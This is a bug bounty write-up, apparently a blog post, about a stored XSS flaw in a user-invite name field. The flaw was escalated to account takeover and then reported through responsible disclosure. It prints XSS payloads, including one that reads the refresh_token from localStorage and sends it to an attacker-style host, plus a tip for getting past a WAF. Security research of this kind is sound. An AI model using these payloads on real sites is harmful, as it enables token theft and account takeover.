# Stored XSS → Account Takeover

- **Source URL:** https://medium.com/@s0ly/stored-xss-account-takeover-7d9db5e6cdcb?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@s0ly
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 10391)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
**بِسْمِ اللَّهِ الرَّحْمَـٰنِ الرَّحِيمِ**

**وَمَا بِكُمْ مِنْ نِعْمَةٍ فَمِنَ اللَّهِ ۖ ثُمَّ إِذَا مَسَّكُمُ الضُّرُّ فَإِلَيْهِ تَجْأَرُونَ**

**\[سورة النحل : 53\]**

My name is Islam Adel, and I’m a Bug Bounty Hunter. I discovered this vulnerability and wanted to share it with you. This is actually my first write-up, so please excuse me if it’s not perfect. I’m currently working with [**Hossam Hussein**](https://medium.com/@hossam13) and [**Mohamed Magdy**](https://x.com/0xmagdy) — and to me, they’re more than just teammates; they’re like brothers.

**Stored Cross-Site Scripting (Stored XSS)** is a type of security vulnerability that allows an attacker to inject malicious scripts into a web application — and have them permanently stored on the server. These scripts are then executed in the browser of any user who accesses the affected page.

### About the Target

The target was **free-palestine.com**, a web platform that allows users to create and manage their own projects. Within a project, users have the ability to **invite or add other users** as collaborators or team members through a user management feature.

This functionality includes a form to input a user’s **first name** and **last name**, which are later displayed across the application, including on the profile page. During testing, I discovered a vulnerability in how this input was handled — which ultimately led to a **Stored XSS** exploit.

### Diving Into the Application

As we started exploring the platform for potential vulnerabilities, we noticed that the **First name and last name was being displayed in multiple locations** across the interface. Naturally, we began testing for possible XSS injection points by trying various payloads.

After several unsuccessful attempts, I navigated to the **profile avatar section** with the intention of changing the username and testing new variations of the payload.

And then — something beautiful happened.

That kind of moment every hacker loves to see.

**I was stunned.** The XSS payload had fired — right there in front of me. No filters, no warnings. Just a clean, beautiful alert.

**You might think this was the end of the story…**

**But in reality, it was only the beginning of what turned into a full account takeover.**

Now that we had identified the **vulnerable injection point — the last name field**, the next challenge was figuring out how to use it to our advantage.

We needed a way to **modify or inject code into another user’s name field** — ideally in a way that would be executed on their end.

We searched. And searched.

And kept searching…

Until we finally **struck gold**.

The breakthrough came when we looked closer at the **“Invite User”** functionality within the project.

When inviting a user to join the project, the application allows you to **manually specify their full name**.

This meant we had direct control over how the name would appear in the UI — and more importantly, we could **embed a malicious XSS payload directly into the full name field**.

Once the invited user joined the project and interacted with any component where their name was rendered, the payload would execute.

**However, we encountered a potential obstacle:**

After the invited user receives the project invitation via email and opens the link, they are prompted to **set their password** — and during that same process, they also have the ability to **change their full name**.

This meant that if the user chose to **completely replace the pre-filled name**, our payload could be lost — effectively preventing the XSS from executing.

At this point, we needed a way to **preserve the payload**, even if the user modified their name.

**But we didn’t give up.**

We kept digging for a workaround — and eventually, we found one.

When the user edits their name, if they **delete the pre-filled full name (including our payload)** and replace it with **only a single word** (e.g., just their first name),

the application internally splits that input into two parts:

- The first word becomes the **first name**
- The second part — which was previously our payload — remains as the **last name**

So, the final rendered name becomes something like:

**samir \<img src=x onerror=alert(document.cookie)>**

Which means… **the payload survives** — and the XSS is triggered as soon as the name is rendered in the UI.

We documented our findings, prepared a detailed proof of concept, and submitted the vulnerability report through the responsible disclosure program.

At this point, we were waiting for the triage team to review our submission and respond.

A few days later, we received a response:

The vulnerability was acknowledged and **initially rated as “Medium”**.

However, the triage team added a note asking if we could provide a **more realistic attack scenario**, ideally one that demonstrates actual impact — especially considering the application uses Authorization headers for access control.

That’s when we shifted our focus from simple alert-based XSS to something much more serious: **account takeover**.

We didn’t waste any time.

We immediately started working on one key question:

**“How can we extract the Authorization token — or something equivalent — to demonstrate real account takeover?"**

Our initial goal was to find a way to **leak the Authorization header** directly, but that proved difficult, as it was being set securely by the application and wasn't accessible via JavaScript.

So, we shifted our focus to exploring other client-side storage options.

Eventually, we discovered that the application uses a **refresh\_token**, which is stored in the browser’s localStorage.

This token is used to **generate a new access\_token automatically** once the current one expires — a standard practice in many web apps.

What made this significant was that:

- **Every user has their own unique refresh\_token**
- The token could be accessed via JavaScript
- And more importantly… it could be stolen using our Stored XSS

At this point, the XSS vulnerability became much more dangerous — it was no longer just about alert pop-ups. It was about full **account takeover**.

To validate our assumption, we crafted a simple XSS payload to check if we could access the refresh\_token directly from localStorage.

We used the following payload:

**\<img src=”x” onerror=”alert(localStorage.getItem(‘refresh\_token’))”>**

As soon as the payload executed, an alert popped up on the screen — displaying the actual refresh\_token.

That was our confirmation:

**The token was accessible via JavaScript — and stealable via XSS.**

We tried many payloads in order to send the refresh\_token to our server or to a collaborator’s server (for Burp collaboration), but the **WAF** was an obstacle in our way.

We were exhausted, and the call to Asr prayer was being made, so we prayed. Then we lay down on the bed to rest a little, opened our phones to browse and disconnect — and suddenly, one of us came across a video of someone bypassing the WAF. So, we got up to try the method — and indeed, it worked! The payload was as follows:

\<img src=”x” onerror=”window.location.href=’[https://attacker.com/steal?token=](https://qlfdee8nrs9hq5estjtd1l0h88ez2pqe.oastify.com/steal?token=)' + localStorage.getItem(‘refresh\_token’)”>

The refresh\_token was successfully sent to our server.

However, we received an unexpected shock from the triage team.

### Final Result:

In the end, we successfully achieved an account takeover via a stored XSS vulnerability by exfiltrating the victim’s refresh token — despite WAF challenges — and the report was accepted with a Medium severity rating.

### Impact

This vulnerability allows an attacker to:

- Take over user accounts.
- Access sensitive user data.
- Perform actions on behalf of other users.

### Tip

If you’re facing WAF restrictions that block common payloads, try using:

window.location.href

### Report Timeline

### Researchers

This vulnerability was discovered by:

**Hossam Hussein**

**Eslam Adel**

**Mohamed Magdy**
